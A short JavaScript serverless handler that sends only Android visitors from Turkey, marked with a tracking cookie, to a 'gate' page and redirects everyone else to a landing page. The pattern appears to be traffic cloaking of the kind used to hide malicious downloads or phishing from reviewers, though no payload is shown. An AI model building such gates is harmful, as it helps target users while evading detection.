export default function handler(req, res) {
    const ua = (req.headers['user-agent'] || '');
    const uaLower = ua.toLowerCase();
    const country = req.headers['x-vercel-ip-country'] || 'XX';

    const isWindows = uaLower.includes('windows');
    const isMac = uaLower.includes('macintosh');
    const isIOS = uaLower.includes('iphone') || uaLower.includes('ipad');
    const isAndroid = uaLower.includes('android');
    const isNotTurkey = country !== 'TR';

    if (isWindows || isMac || isIOS || isNotTurkey || !isAndroid) {
        res.setHeader('Cache-Control', 'no-store');
        res.setHeader('Location', '/landing.html');
        res.status(302).end();
        return;
    }

    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Set-Cookie', '_src=1; Path=/; Max-Age=604800; SameSite=Lax');
    res.setHeader('Location', '/gate.html');
    res.status(302).end();
}
